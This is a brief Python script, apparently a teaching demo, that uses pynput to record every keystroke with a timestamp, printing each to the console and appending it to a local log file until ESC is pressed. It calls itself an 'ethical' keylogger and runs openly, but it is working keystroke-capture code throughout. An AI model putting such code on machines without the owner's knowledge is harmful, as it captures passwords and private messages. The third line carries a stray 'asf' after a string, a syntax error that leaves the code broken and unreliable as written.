from pynput import keyboard
from datetime import datetime
log_file = "keystroke_demo_log.txt"asf
print("Ethical Keylogger Running... (Press ESC to stop)")
print(" Type anything. Keystrokes will appear below:\n")
def on_press(key):
    time_stamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        key_char = key.char
    except AttributeError:
        key_char = f"[{key}]"
    log_entry = f"{time_stamp} - {key_char}"
    print(log_entry)
    with open(log_file, "a") as f:
        f.write(log_entry + "\n")
def on_release(key):
    if key == keyboard.Key.esc:
        print("\n Keylogger Stopped.")
        return False  # stop listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
